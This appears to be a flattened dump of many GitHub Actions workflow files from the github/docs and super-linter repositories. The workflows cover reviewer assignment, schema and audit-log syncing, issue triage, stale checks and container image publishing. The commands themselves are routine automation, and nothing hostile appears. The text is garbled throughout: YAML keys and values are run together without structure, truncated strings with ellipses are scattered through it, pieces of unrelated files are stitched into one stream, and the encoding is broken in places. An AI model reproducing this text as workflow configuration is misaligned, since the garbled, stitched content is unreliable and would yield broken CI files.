elif [[ "${{ github.repository }}" == 'github/docs' ]]; then
  echo "APP_URL=https://adjective-noun-hash-4000.app.github.dev" >> $GITHUB_ENV
fi
name: Set APP_URLFind code changes comment<!-- REVIEW_COMMENT -->'<!-- R ... NT -->'Get changes tablechangesAPP_URL${{ env.APP_URL }}BASE_SHA${{ github.event.pull_request.base.sha }}HEAD_SHAnpm run content-changes-table-commentname: G ... s table<!-- REVIEW_COMMENT -->
### How to review these changes ðŸ‘“

Thank you for your contribution. To review these changes, choose one of the following options:

* [Spin up a codespace][codespace]
* [Set up a local development environment][local]
${{ github.repository == 'github/docs-internal' && '* [Deploy a staging server][staging]' || '' }}

${{ fromJSON('["A Hubber will need to deploy your changes internally to review.",""]')[github.repository == 'github/docs-internal'] }}

<details><summary>Table of review links</summary>

**Note**: Please update the URL for your staging server or codespace.

${{ steps.changes.outputs.changesTable && 'The table shows the files in the `content` directory that were changed in this pull request. This helps you review your changes on a staging server. Changes to the `data` directory are not included in this table.' || '' }}

${{ steps.changes.outputs.changesTable || '_This pull request contains code changes, so we will not generate a table of review links._' }}

${{ steps.changes.outputs.changesTable && 'Key: **fpt**: Free, Pro, Team; **ghec**: GitHub Enterprise Cloud; **ghes**: GitHub Enterprise Server' || '' }}

</details>

ðŸ¤– This comment is [automatically generated][workflow].

[workflow]: ${{ github.server_url }}/${{ github.repository }}/blob/${{ github.workflow_sha }}/.github/workflows/review-comment.yml
[codespace]: ${{ github.repository == 'github/docs-internal' && 'https://github.com/github/docs-team/blob/main/contributing-to-docs/tips-and-tricks/use-a-codespace-to-review.md' || 'https://docs.github.com/en/contributing/setting-up-your-environment-to-work-on-github-docs/working-on-github-docs-in-a-codespace' }}
[local]: https://docs.github.com/en/contributing/setting-up-your-environment-to-work-on-github-docs/creating-a-local-environment#setting-up-your-local-environment
[staging]: https://github.com/github/docs-team/blob/main/contributing-to-docs/tips-and-tricks/deploying-pr-to-staging-servers.md
if: ${{ ... cs') }}review-comment:name: Review comment/home/huawei/github-actions-security/.github/workflows/github_docs__reviewers-content-systems.ymlReviewers - Content SystemsReviewe ... Systemscontributing/content-*.md'contri ... t-*.md'content/contributing/**.md'conten ... /**.md'.github/workflows/reviewers-content-systems.yml.github ... ems.yml- 'cont ... t-*.md'reviewers-content-systemsreviewe ... systems${{ github.repository == 'github/docs-internal' &&
    !github.event.pull_request.draft &&
    !contains(github.event.pull_request.labels.*.name, 'reviewers-content-systems') &&
    github.event.pull_request.head.ref != 'repo-sync' }}PR: ${{ ... _url }}Add content systems as a reviewerAdd con ... eviewergh pr edit $PR --add-reviewer github/docs-content-systems
gh pr edit $PR --add-label reviewers-content-systems
name: A ... eviewer- name: ... eviewerreviewe ... ystems:name: R ... Systems/home/huawei/github-actions-security/.github/workflows/github_docs__reviewers-dependabot.ymlReviewers - DependabotReviewe ... endabotdata/reusable/dependabot/**'data/r ... bot/**'content/code-security/dependabot/**'conten ... bot/**'content/rest/dependabot/**.github/workflows/reviewers-dependabot.yml'.githu ... ot.yml'- 'data ... bot/**'add-reviewer${{ github.repository == 'github/docs-internal' &&
    !github.event.pull_request.draft &&
    !contains(github.event.pull_request.labels.*.name, 'reviewers-dependabot') &&
    github.event.pull_request.head.ref != 'repo-sync' }}Add Dependabot Core Maintainers as reviewersAdd Dep ... viewersgh pr edit $PR --add-reviewer github/dependabot-updates-reviewers
gh pr edit $PR --add-label reviewers-dependabot
name: A ... viewers- name: ... viewersadd-reviewer:name: R ... endabot/home/huawei/github-actions-security/.github/workflows/github_docs__reviewers-docs-engineering.ymlReviewers - Docs EngineeringReviewe ... neering**.js'**.js'**.ts'**.ts'**.tsx'**.tsx'**.scss'**.scss'src/**'src/**'!src/**.json'!src/**.json'!src/**.yml'!src/**.yml'.github/**'.github/**'config/**'config/**'.devcontainer/**'.devcontainer/**'**Dockerfile'**Dockerfile'.github/workflows/reviewers-docs-engineering.yml- '**.js'codeowners-docs-engineeringcodeown ... neering${{ github.repository == 'github/docs-internal' &&
    !github.event.pull_request.draft &&
    !contains(github.event.pull_request.labels.*.name, 'reviewers-docs-engineering') &&
    github.event.pull_request.head.ref != 'repo-sync' }}Add docs engineering as a reviewerAdd doc ... eviewergh pr edit $PR --add-reviewer github/docs-engineering
gh pr edit $PR --add-label reviewers-docs-engineering
codeown ... eering:name: R ... neering/home/huawei/github-actions-security/.github/workflows/github_docs__reviewers-legal.ymlReviewers - Legal.github/workflows/reviewers-legal.yml.github ... gal.yml- 'content/**'codeowners-legal${{ github.repository == 'github/docs-internal' &&
    !github.event.pull_request.draft &&
    !contains(github.event.pull_request.labels.*.name, 'reviewers-legal') &&
    github.event.pull_request.head.ref != 'repo-sync' }}files: 'content/**'Check content typecheckContentTypenpm run check-content-typenpm run ... nt-typeCHANGED_FILE_PATHS${{ ste ... iles }}CONTENT_TYPErai'rai'CHANGED ... iles }}name: C ... nt typeCheck for reviewers-legal label, add if missing and request reviewsteps.checkContentType.outputs.containsContentType == 'true'gh pr edit $PR --add-reviewer github/legal-product
gh pr edit $PR --add-label reviewers-legal
codeowners-legal:name: R ... - Legal/home/huawei/github-actions-security/.github/workflows/github_docs__site-policy-reminder.ymlSite Policy Remindergithub.event.label.name == 'Site Policy' && github.repository == 'github/docs-internal'${{ secrets.API_TOKEN_SITEPOLICY }}${{ sec ... LICY }}GITHUB_ ... LICY }}Before merging, please remember to change the title of this PR to a description of its changes that is suitable for public viewing on github/site-policy.

<@github/site-policy-admins>, when these changes are ready to be synced to the site policy repo for the 24-hour or 30-day [review window](https://github.com/github/site-policy#whats-the-process), run the [site policy sync action](https://github.com/github/docs-internal/actions/workflows/site-policy-sync.yml) from this PR's branch. When these changes are ready to be merged in `docs-internal`, let the Docs team know on Slack in #docs-content and a writer will merge this PR.
name: S ... eminder/home/huawei/github-actions-security/.github/workflows/github_docs__site-policy-sync.ymlSite policy synccontent/site-policy/**'conten ... icy/**'.github/workflows/site-policy-sync.yml'.githu ... nc.yml'- 'cont ... icy/**'Get the latest docsgithub.event_name == 'workflow_dispatch' || (github.event.pull_request.merged == true && github.repository == 'github/docs-internal')github. ... ernal')checkout docs-internalcheckou ... nternalname: c ... nternalcheckout public site-policycheckou ... -policygithub/site-policypublic-reporeposit ... -policyname: c ... -policyCommits internal policies to copy of public repo with descriptive message from triggering PR titleCommits ... R titlePR_TITL ... itle }}cd public-repo
git config --local user.name 'site-policy-bot'
git config --local user.email 'site-policy-bot@github.com'
rm -rf Policies
cp -r ../content/site-policy Policies
git status
git checkout -b automated-sync-$GITHUB_RUN_ID
git add .
echo PR_TITLE: $PR_TITLE
[[ ! -z $PR_TITLE ]] && DESCRIPTION="${PR_TITLE}" || DESCRIPTION="Update manually triggered by workflow"
echo "DESCRIPTION=$DESCRIPTION" >> $GITHUB_ENV
git commit -m "$(echo $DESCRIPTION)"
name: C ... R titleIf there are changes to push, create a branch in the public repo and push changesIf ther ... changescd public-repo
git config --local user.name 'site-policy-bot'
git config --local user.email 'site-policy-bot@github.com'
NUM_FILES_CHANGED=$(git diff --name-only HEAD^..HEAD | wc -l)
if [[ $NUM_FILES_CHANGED -ge 1 ]]
  then
    git push --set-upstream origin automated-sync-$GITHUB_RUN_ID
  else
    echo "No updates to push to the public repo"
fi
name: I ... changes- name: ... nternalname: G ... st docsname: S ... cy sync/home/huawei/github-actions-security/.github/workflows/github_docs__sme-review-tracking-issue.ymlCreate SME review tracking issueCreate  ... g issuecreate-sme-review-tracking-issuecreate- ... g-issuegithub.repository == 'github/docs' && github.event.label.name == 'needs SME'github. ... ds SME'create-issueURL${{ github.event.pull_request.html_url || github.event.issue.html_url }}URL: ${ ... _url }}
const issueNo = context.number || context.issue.number

// Create an issue in docs-team repo
await github.rest.issues.create({
  owner: 'github',
  repo: 'docs-team',
  title: `SME tracking issue for \#${issueNo}`,
  body: `### Issue / PR that requires an SME review

${process.env.URL}

### Reason for SME review

@${context.payload.sender.login} (Optional) _Insert short answer regarding why SME assistance is required to review this contribution_

### Location SME review was requested

_Insert link to the location SME review was initially requested_

#### In the comments below, include notes regarding SME review progress (examples) -

- Routed to another channel / team
- Reviewer stating they'll need to get back to us at a later time
- Review provided was unclear or missing key information, and a follow-up is necessary
`,
  labels: ['on track','open source', 'sme-review'],
});id: create-issue- id: create-issuecreate- ... -issue:name: C ... g issue/home/huawei/github-actions-security/.github/workflows/github_docs__stale.ymlStaleThis issue is stale because there have been no updates in 365 days.'This i ...  days.'This PR is stale because there have been no updates in 365 days.'This P ...  days.'365never-stale,waiting for review'never- ... review'never-stale,help wanted,waiting for review1000name: Stale/home/huawei/github-actions-security/.github/workflows/github_docs__sync-audit-logs.ymlSync Audit Log dataupdate-audit-log-filesupdate- ... g-filesRun updater scriptnpm run sync-audit-log
Get the audit-log-allowlists SHA being syncedCOMMIT_SHA=$(cat src/audit-logs/lib/config.json | jq -r '.sha')
echo "COMMIT_SHA=$COMMIT_SHA" >> $GITHUB_OUTPUT
echo "Commit SHA from audit-log-allowlists: $COMMIT_SHA"
if [ -z $COMMIT_SHA ]; then
  echo "audit-log-allowlists commit SHA is empty!"
  exit 1
fi
Create and merge pull requestCreate  ... requestecho "Creating a new branch if needed..."
branchname=audit-logs-schema-update-${{ steps.audit-log-allowlists.outputs.COMMIT_SHA }}
remotesha=$(git ls-remote --heads origin $branchname)
if [ -n "$remotesha" ]; then
  # output is not empty, it means the remote branch exists
  echo "Branch $branchname already exists in 'github/docs-internal'. Exiting..."
  exit 0
fi
git checkout -b $branchname
echo "Created a new branch $branchname"

echo "Preparing commit..."
git config --global user.name "docs-bot"
git config --global user.email "77750099+docs-bot@users.noreply.github.com"
git add -A .
echo "Prepared commit"

echo "Check if there are changes..."
if git diff-index --cached --quiet HEAD -- . ':(exclude)src/audit-logs/lib/config.json'
then
  echo "No real changes (only the SHA in config.json moved). Exitingâ€¦"
  exit 0
fi
echo "Changes detected, proceeding"

echo "Creating commit..."
git commit -m "Add updated audit log event data"
echo "Created commit"

echo "Pushing commit..."
git push origin $branchname
echo "Pushed commit"

echo "Creating pull request..."
gh pr create \
  --title "Update audit log event data" \
  --body 'ðŸ‘‹ humans. This PR updates the audit log event data with the latest changes. (Synced from github/audit-log-allowlists)

  If CI does not pass or other problems arise, contact #docs-engineering on slack.' \
  --repo github/docs-internal \
  --label audit-log-pipeline \
  --head=$branchname
echo "Created pull request"

# can't approve your own PR, approve with Actions
echo "Approving pull request..."
unset GITHUB_TOKEN
gh auth login --with-token <<< "${{ secrets.GITHUB_TOKEN }}"
gh pr review --approve
echo "Approved pull request"

# Actions can't merge the PR so back to docs-bot to merge the PR
echo "Setting pull request to auto merge..."
unset GITHUB_TOKEN
gh auth login --with-token <<< "${{ secrets.DOCS_BOT_PAT_BASE }}"
gh pr merge --auto
echo "Set pull request to auto merge"
update- ... -files:name: S ... og data/home/huawei/github-actions-security/.github/workflows/github_docs__sync-codeql-cli.ymlSync CodeQl CLIBranch to pull the source files from in the semmle-code repo.'Branch ...  repo.'descrip ...  repo.'generate-codeql-filesgenerat ... l-filesCheckout semmle-code repoCheckou ... de repogithub/semmle-codesemmle-code${{ inputs.SOURCE_BRANCH }}${{ inp ... ANCH }}name: C ... de repoGet the semmle-code SHA being syncedcd semmle-code
OPENAPI_COMMIT_SHA=$(git rev-parse HEAD)
echo "OPENAPI_COMMIT_SHA=$OPENAPI_COMMIT_SHA" >> $GITHUB_OUTPUT
echo "Copied files from github/semmle-code repo. Commit SHA: $OPENAPI_COMMIT_SHA"
Install pandoc# Remove all previous pandoc versions
sudo apt-get purge --auto-remove pandoc
# Download pandoc
wget https://github.com/jgm/pandoc/releases/download/3.0.1/pandoc-3.0.1-1-amd64.deb
# Install pandoc
sudo dpkg -i pandoc-3.0.1-1-amd64.deb
# Output the pandoc version installed
pandoc -v
rm pandoc-3.0.1-1-amd64.deb
name: Install pandocSync the CodeQL CLI dataSync th ... LI datanpm run sync-codeql-cli
git status
echo "Deleting the cloned github/semmle-code repo..."
rm -rf semmle-code
name: S ... LI data# If nothing to commit, exit now. It's fine. No orphans.
changes=$(git diff --name-only | wc -l)
untracked=$(git status --untracked-files --short | wc -l)
if [[ $changes -eq 0 ]] && [[ $untracked -eq 0 ]]; then
  echo "There are no changes to commit after running 'npm run sync-codeql-cli'. Exiting..."
  exit 0
fi

git config --global user.name "docs-bot"
git config --global user.email "77750099+docs-bot@users.noreply.github.com"

branchname=codeql-cli-update-${{ steps.semmle-code.outputs.OPENAPI_COMMIT_SHA }}

branchCheckout=$(git checkout -b $branchname)
if [[ ! $? -eq 0 ]]; then
  echo "Branch $branchname already exists in `github/docs-internal`. Exiting..."
  exit 0
fi
git add .
git commit -m "Update CodeQL CLI data"
git push -u origin $branchname

echo "Creating pull request..."
gh pr create \
  --title "Update CodeQL CLI manual" \
  --body 'ðŸ‘‹ humans. This PR updates the CodeQL CLI manual Markdown pages with the latest changes in preparation for the next **CodeQL CLI** release.

  This will be reviewed and merged by the Code scanning and GHAS focus team as part of the release of CodeQL CLI. (Synced from semmle-code@${{ steps.semmle-code.outputs.OPENAPI_COMMIT_SHA }})

  If CI does not pass or other problems arise, contact #docs-engineering on slack.' \
  --repo github/docs-internal \
  --label "codeql-cli-pipeline,skip FR board,ready-for-doc-review"
generat ... -files:name: S ... eQl CLI/home/huawei/github-actions-security/.github/workflows/github_docs__sync-graphql.ymlSync GraphQL schemaupdate_graphql_filesRun updater scriptsnpm run sync-graphqlUpdate GraphQL data files'Update ...  files'GraphQL schema updateGraphQL ...  updateHello! Some GraphQL data in github/github was updated recently. This PR syncs up the GraphQL data in this repo.

 If CI passes, this PR will be auto-merged. :green_heart:

 If CI does not pass or other problems arise, contact #docs-engineering on slack."Hello! ... This PRgraphql-schema-updategraphql ... -updategit push origin --delete graphql-schema-updateupdate_ ... _files:name: S ...  schema/home/huawei/github-actions-security/.github/workflows/github_docs__sync-openapi.ymlSync OpenAPI schemaBranch to pull the dereferenced OpenAPI source files from in the github/rest-api-descriptions repo.generate-decorated-filesgenerat ... d-filesCheckout rest-api-description repoCheckou ... on repogithub/rest-api-descriptiongithub/ ... riptionrest-api-descriptionreposit ... riptionname: C ... on repogithub/models-gatewaygithub/ ... gatewaymodels-gatewayreposit ... gatewaySync the REST, Webhooks, and GitHub Apps schemasSync th ... schemasnpm run sync-rest -- \
  --source-repos rest-api-description models-gateway \
  --output rest github-apps webhooks rest-redirects
git status
echo "Deleting the cloned github/rest-api-description repo..."
rm -rf rest-api-description
name: S ... schemasGet the rest-api-description SHA being syncedOPENAPI_COMMIT_SHA=$(cat src/rest/lib/config.json | jq -r '.sha')
echo "OPENAPI_COMMIT_SHA=$OPENAPI_COMMIT_SHA" >> $GITHUB_OUTPUT
echo "Copied files from github/rest-api-description repo. Commit SHA: $OPENAPI_COMMIT_SHA"
if [ -z $OPENAPI_COMMIT_SHA ]; then
  echo "OpenAPI commit SHA is empty!"
  exit 1
fi
# If nothing to commit, exit now. It's fine. No orphans.
changes=$(git diff --name-only | wc -l)
if [[ $changes -eq 0 ]]; then
  echo "There are no changes to commit after running `npm run sync-rest` Exiting..."
  exit 0
fi

git config --global user.name "docs-bot"
git config --global user.email "77750099+docs-bot@users.noreply.github.com"

branchname=openapi-update-${{ steps.rest-api-description.outputs.OPENAPI_COMMIT_SHA }}

remotesha=$(git ls-remote --heads origin $branchname)
if [ -n "$remotesha" ]; then
  # output is not empty, it means the remote branch exists
  echo "Branch $branchname already exists in 'github/docs-internal'. Exiting..."
  exit 0
fi

git checkout -b $branchname
git add .
git commit -m "Add decorated OpenAPI schema files"
git push origin $branchname

echo "Creating pull request..."
gh pr create \
  --title "Update OpenAPI Description" \
  --body 'ðŸ‘‹ humans. This PR updates the OpenAPI description with the latest changes. (Synced from github/rest-api-description@${{ steps.rest-api-description.outputs.OPENAPI_COMMIT_SHA }})

  If CI does not pass or other problems arise, contact #docs-engineering on slack.' \
  --repo github/docs-internal \
  --label github-openapi-bot \
  --head=$branchname \
/home/huawei/github-actions-security/.github/workflows/github_docs__sync-secret-scanning.ymlSync Secret Scanning dataSync Se ... ng datacron: ' ... :22 PST- cron: ... :22 PSTupdate-secret-scanning-fileupdate- ... ng-fileSync secret scanning dataSync se ... ng datasecret-scanning-syncnpm run sync-secret-scanning
name: S ... ng dataCreate a pull request# If nothing to commit, exit now. It's fine.
changes=$(git diff --name-only | wc -l)
untracked=$(git status --untracked-files --short | wc -l)
if [[ $changes -eq 0 ]] && [[ $untracked -eq 0 ]]; then
  echo "There are no changes to commit. Exiting..."
  exit 0
fi

git config --global user.name "docs-bot"
git config --global user.email "77750099+docs-bot@users.noreply.github.com"

branchname=sync-secret-scanning-${{ steps.secret-scanning-sync.outputs.sha }}

remotesha=$(git ls-remote --heads origin $branchname)
if [ -n "$remotesha" ]; then
  # output is not empty, it means the remote branch exists
  echo "Branch $branchname already exists in 'github/docs-internal'. Exiting..."
  exit 0
fi

git checkout -b $branchname
git add .
git commit -m "Add updated secret scanning data"
git push origin $branchname

echo "Creating pull request..."
gh pr create \
  --title "Sync secret scanning data" \
  --body 'ðŸ‘‹ humans. This PR updates the secret scanning data with the latest changes from github/token-scanning-service.

  /cc @github/docs-content-security-products

  If CI does not pass or other problems arise, contact #docs-engineering on Slack.' \
  --repo github/docs-internal \
  --label secret-scanning-pipeline,'skip FR board',ready-for-doc-review \
  --head=$branchname
update- ... g-file:/home/huawei/github-actions-security/.github/workflows/github_docs__test-changed-content.ymlTest changed content.github/workflows/test-changed-content.ymltest-changed-contentDELETED_FILES${{ steps.changed_files.outputs.filtered_deleted_files }}npm test -- src/content-render/tests/render-changed-and-deleted-files.jsnpm tes ... iles.jstest-ch ... ontent:name: T ... content/home/huawei/github-actions-security/.github/workflows/github_docs__test.yml${{ matrix.name }}archivesarticle-apiassetsaudit-logsautomated-pipelineschangelogscolor-schemescontent-lintercontent-renderdata-directoryearly-accesseventsfixturesframegithub-appsgraphqllandingslearning-trackobservabilityproductsredirectsrelease-notesrestsearchsecret-scanningshieldingtrackingwebhooks- archivesisPrivateRepo- ${{ g ... nal' }}name: languages- name: languagesname:${{ matrix.name == 'search' || matrix.name == 'languages' }}${{ mat ... ges' }}Check the test fixture data (if applicable)Check t ... icable)${{ matrix.name == 'fixtures' }}${{ mat ... res' }}npm run copy-fixture-data -- --checknpm run ... --checkname: C ... icable)Check the test fixture content (if applicable)# If either of these fail, it means our fixture content's internal
# links can and should be updated.
npm run update-internal-links -- --dry-run --check --strict \
  src/fixtures/fixtures/content \
  --exclude src/fixtures/fixtures/content/get-started/foo/typo-autotitling.md \
  --exclude src/fixtures/fixtures/content/get-started/foo/anchor-autotitling.md
npm run update-internal-links -- --dry-run --check --strict \
  src/fixtures/fixtures/data
${{ matrix.name == 'languages' }}Gather files changed${{ matrix.name == 'content-linter' }}${{ mat ... ter' }}head${{ github.event.pull_request.head.ref || github.event.merge_group.head_ref }}output_fileget_diff_files.txthead: $ ... _ref }}name: G ... changed${{ matrix.name == 'redirects' }}${{ mat ... cts' }}${{ matrix.name == 'article-api' }}${{ mat ... api' }}DIFF_FILECHANGELOG_CACHE_FILE_PATHCHANGEL ... LE_PATHsrc/fixtures/fixtures/changelog-feed.jsonsrc/fix ... ed.json${{ matrix.name == 'languages' && 'all' || '' }}${{ mat ... | '' }}${{ (matrix.name == 'fixtures' || matrix.name == 'article-api' || matrix.name == 'landings' ) && 'src/fixtures/fixtures' || '' }}${{ (ma ... | '' }}TRANSLATIONS_FIXTURE_ROOTTRANSLA ... RE_ROOT${{ (matrix.name == 'fixtures' || matrix.name == 'article-api') && 'src/fixtures/fixtures/translations' || '' }}DIFF_FI ... les.txtnpm test -- src/${{ matrix.name }}/tests/npm tes ... /tests/name: $ ... name }}/home/huawei/github-actions-security/.github/workflows/github_docs__triage-issue-comments.ymlTriage new issue commentsTriage  ... ommentstriage-issue-commentstriage- ... omments${{ github.repository == 'github/docs' && !github.event.issue.pull_request }}${{ git ... uest }}is-internal-contributoris-inte ... ributorconst repo = context.payload.repository.name
const org = context.payload.repository.owner.login
const actor = context.actor
let collaboratorStatus = ''
try {
  collaboratorStatus = await github.request('GET /repos/{owner}/{repo}/collaborators/{username}', {
    owner: org,
    repo: repo,
    username: actor
  })
  console.log(`This issue was commented on by a Hubber.`)
  return 'true'
} catch (error) {
  console.log(`This issue was commented on by an external contributor.`)
  return 'false'
}
result- ...  stringCheck issue existsexistsif gh issue view $ISSUE_URL > /dev/null 2>&1
then
  echo "exists=y" >> $GITHUB_OUTPUT
else
  echo "exists=n" >> $GITHUB_OUTPUT
fi
name: C ...  existsLabel issues with new comments with 'triage'Label i ... triage'${{ steps.is-internal-contributor.outputs.result == 'false' && steps.exists.outputs.exists == 'y' }}${{ ste ...  'y' }}addLabels'triage'ignoreIfLabeledaddLabels: 'triage'name: L ... triage'if: ${{ ... uest }}triage- ... mments:name: T ... omments/home/huawei/github-actions-security/.github/workflows/github_docs__triage-issues.ymlTriage new issuestriage_issuesLabel new issues with 'triage'Label n ... triage'triage_issues:name: T ...  issues/home/huawei/github-actions-security/.github/workflows/github_docs__triage-pull-requests.ymlTriage new pull requestsTriage  ... equeststriage_pullsLabel new pull requests with 'triage'triage_pulls:name: T ... equests/home/huawei/github-actions-security/.github/workflows/github_docs__triage-stale-check.ymlPublic Repo Stale CheckPublic  ... e Check20 16 * * 1-5'20 16 * * 1-5'stale_contributorA stale label has been added to this issue and it has been closed, because it has been open for 30 days with no activity. If you think this issue should remain open, please add a new comment.'A stal ... mment.'help wanted,never-stale,waiting for review'help w ... review'A stale label has been added to this pull request because it has been open 30 days with no activity. If you think this pull request should remain open, please add a new comment.waiting for review,never-stale,ready to merge'waitin ...  merge'stale_staffThis is a gentle bump for the docs team that this PR is waiting for review.never-stale'never-stale'stale_contributor:name: P ... e Check/home/huawei/github-actions-security/.github/workflows/github_docs__triage-unallowed-contributions.ymlCheck unallowed file changesCheck u ... changes${{
  github.repository == 'github/docs' &&
  github.event.pull_request.user.login != 'docs-bot' &&
  github.event.pull_request.user.login != 'dependabot[bot]'
}}Get files changeddorny/paths-filter@0bc4621a3135347011ad047f9ecf449bf72ce2bddorny/p ... 72ce2bdbaselist-filesjsonsrc/workflows/unallowed-contribution-filters.yml'src/wo ... rs.yml'base: 'main'${{ steps.filter.outputs.notAllowed || steps.filter.outputs.contentTypes}}${{ ste ... Types}}Comment about changes we can't accept"Commen ... accept"npm run unallowed-contributionsnpm run ... butionsREPO_OWNER_AND_NAMEFILE_PATHS_NOT_ALLOWEDFILE_PA ... ALLOWED${{ steps.filter.outputs.notAllowed_files }}${{ steps.filter.outputs.contentTypes_files }}ADDED_CONTENT_FILES${{ steps.filter.outputs.added_files }}REPO_OW ... tory }}name: " ... accept"/home/huawei/github-actions-security/.github/workflows/github_docs__validate-asset-images.ymlValidate asset imagesValidat ...  images.github/workflows/validate-asset-images.yml'.githu ... es.yml'validate-asset-imagesvalidat ... -imagesValidate all asset imagesnpm run validate-asset-imagesnpm run ... -imagesname: V ...  imagesvalidat ... images:/home/huawei/github-actions-security/.github/workflows/github_docs__validate-github-github-docs-urls.ymlValidate github/github docs URLsValidat ... cs URLs${{ github.workflow }}-${{ github.ref }}validate_github_github_docs_urlsvalidat ... cs_urlsgithub/githubRun validation# This will generate a .json file which we can use to
# do other things in other steps.
npm run validate-github-github-docs-urls -- validate \
  --output checks.json \
  github/config/docs-urls.json
name: Run validationUpdate config/docs-urls.json in github/github (possibly)Update  ... ssibly)${{ github.event_name == 'schedule' || github.event_name == 'workflow_dispatch' }}${{ git ... tch' }}npm run validate-github-github-docs-urls -- generate-new-json checks.json github/config/docs-urls.json

git config --global user.name "docs-bot"
git config --global user.email "77750099+docs-bot@users.noreply.github.com"

cd github
git status
git diff
changes=$(git diff --name-only | wc -l)
if [[ $changes -eq 0 ]]; then
  echo "There are no changes to commit after running generate-new-json. Exiting this step"
  exit 0
fi

current_timestamp=$(date '+%Y-%m-%d-%H%M%S')
branch_name="update-docs-urls-$current_timestamp"
git checkout -b "$branch_name"
current_daystamp=$(date '+%Y-%m-%d')
git commit -a -m "Update Docs URLs from automation ($current_daystamp)"
git push origin "$branch_name"

# XXX TODO
# Perhaps post an issue somewhere, about that the fact that this
# branch has been created and now needs to be turned into a PR
# that some human can take responsibility for.
name: U ... ssibly)Clean up old branches in github/githubClean u ... /githubnpm run validate-github-github-docs-urls -- clean-up-old-branches --prefix update-docs-urls

echo "To see them all, go to:"
echo "https://github.com/github/github/branches/all?query=update-docs-urls-"
content/**
Generate PR comment${{ github.event_name == 'pull_request' && steps.changed_files.outputs.filtered_changed_files }}${{ git ... iles }}ISSUE_NUMBERnpm run validate-github-github-docs-urls -- post-pr-comment checks.json --changed-files $CHANGED_FILES
name: G ... comment- name: ...  branchname: V ... cs URLsvalidat ... s_urls:/home/huawei/github-actions-security/.github/workflows/github_super-linter__cd.ymlPublish ImagesBuild and Test${{ github.workflow }}-main-${{ matrix.images.target }}${{ git ... rget }}group:  ... rget }}imagesprefixslim-targetslimprefix: slim-""standardprefix: ""- prefix: slim-images:CONTAINER_IMAGE_IDghcr.io/super-linter/super-linter:${{ matrix.images.prefix }}latest"ghcr.i ... latest"CONTAINER_IMAGE_TARGETCONTAIN ... _TARGET${{ matrix.images.target }}"${{ ma ... get }}"CONTAIN ... latest"Checkout Codename: Checkout CodeSet build metadataif [[ ${{ github.event_name }} == 'push' ]] || [[ ${{ github.event_name }} == 'merge_group' ]]; then
  BUILD_REVISION=${{ github.sha }}
elif [[ ${{ github.event_name }} == 'pull_request' ]]; then
  BUILD_REVISION=${{ github.event.pull_request.head.sha }}
else
  echo "[ERROR] Event not supported when setting build revision and build version"
  exit 1
fi

. scripts/build-metadata.sh

if [ -z "${BUILD_DATE}" ]; then
  echo "[ERROR] BUILD_DATE is empty"
  exit 1
fi

if [ -z "${BUILD_REVISION}" ]; then
  echo "[ERROR] BUILD_REVISION is empty"
  exit 1
fi

if [ -z "${BUILD_VERSION}" ]; then
  echo "[ERROR] BUILD_VERSION is empty"
  exit 1
fi

echo "Build date (GH Actions workflow): ${BUILD_DATE}"
echo "Build revision (GH Actions workflow): ${BUILD_REVISION}"
echo "Build version (GH Actions workflow): ${BUILD_VERSION}"

{
  echo "BUILD_DATE=${BUILD_DATE}"
  echo "BUILD_REVISION=${BUILD_REVISION}"
  echo "BUILD_VERSION=${BUILD_VERSION}"
} >> "${GITHUB_ENV}"
name: S ... etadataFree Disk spacesudo rm -rf /usr/local/lib/android || true
sudo rm -rf /usr/share/dotnet || true
sudo rm -rf /opt/ghc || true
sudo rm -rf /usr/local/.ghcup || true
Build Image./DockerfileBUILD_DATE=${{ env.BUILD_DATE }}
BUILD_REVISION=${{ env.BUILD_REVISION }}
BUILD_VERSION=${{ env.BUILD_VERSION }}
cache-fromtype=registry,ref=${{ env.CONTAINER_IMAGE_ID }}-buildcachetype=re ... ldcacheloadGITHUB_TOKEN=${{ secrets.GITHUB_TOKEN }}
${{ env.CONTAINER_IMAGE_ID }}
name: Build ImageRun Test Suitename: Run Test SuiteLogin to GHCRdocker/login-action@v3.3.0docker/ ... @v3.3.0name: Login to GHCRBuild and Push Imagecache-totype=registry,ref=${{ env.CONTAINER_IMAGE_ID }}-buildcache,mode=maxtype=re ... ode=maxname: B ... h ImageCreate Issue on FailureCreate  ... Failurefailure()const create = await github.rest.issues.create({
  owner: context.repo.owner,
  repo: context.repo.repo,
  title: "Failed to deploy to production",
  body: "Automation has failed us!\nMore information can be found at:\n - ${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}",
  assignees: [
    "zkoppert", "Hanse00", "ferrarimarco"
  ]
})
github- ... TOKEN}}name: C ... Failure- name: ... ut Codename: Build and Test- test${{ github.workflow }}-main-release${{ git ... releasegroup:  ... releasegoogleapis/release-please-action@v4.1.3googlea ... @v4.1.3.github/release-please/release-please-config.json.github ... ig.jsonmanifest-file.github/release-please/.release-please-manifest.json.github ... st.jsonconfig- ... ig.jsonuses: g ... @v4.1.3Configure release metedataConfigu ... etedatasteps.release.outputs.release_createdsteps.r ... createdRELEASE_VERSION="${{ steps.release.outputs.tag_name }}"

if [ -z "${RELEASE_VERSION}" ]; then
  echo "Error RELEASE_VERSION is empty. Exiting..."
  exit 1
fi

if ! echo "${RELEASE_VERSION}" | grep -E -o "v[[:digit:]]+\.[[:digit:]]+\.[[:digit:]]+"; then
  echo "Error: RELEASE_VERSION doesn't look like a semantic version: ${RELEASE_VERSION}"
  exit 2
fi

SEMVER_MAJOR_VERSION=v${{ steps.release.outputs.major }}

{
  echo "RELEASE_VERSION=${RELEASE_VERSION}"
  echo "SEMVER_MAJOR_VERSION=${SEMVER_MAJOR_VERSION}"
} >> "${GITHUB_ENV}"
name: C ... etedataRetag and Push ImagesRetag a ...  Imagesakhilerm/tag-push-action@v2.2.0akhiler ... @v2.2.0ghcr.io/super-linter/super-linter:latestghcr.io ... :latestdstghcr.io/super-linter/super-linter:${{ env.SEMVER_MAJOR_VERSION }}
ghcr.io/super-linter/super-linter:${{ env.RELEASE_VERSION }}
src: gh ... :latestname: R ...  ImagesRetag and Push Images slimRetag a ... es slimghcr.io/super-linter/super-linter:slim-latestghcr.io ... -latestghcr.io/super-linter/super-linter:slim-${{ env.SEMVER_MAJOR_VERSION }}
ghcr.io/super-linter/super-linter:slim-${{ env.RELEASE_VERSION }}
src: gh ... -latestname: R ... es slimTag major, minor, and latest versionsTag maj ... ersionsgit config user.email "41898282+github-actions[bot]@users.noreply.github.com"
git config user.name "github-actions[bot]"

git tag --annotate --force ${{ env.SEMVER_MAJOR_VERSION }} -m "Release ${{ env.SEMVER_MAJOR_VERSION }}"
git tag --annotate --force latest -m "Release latest (${{ env.RELEASE_VERSION }})"

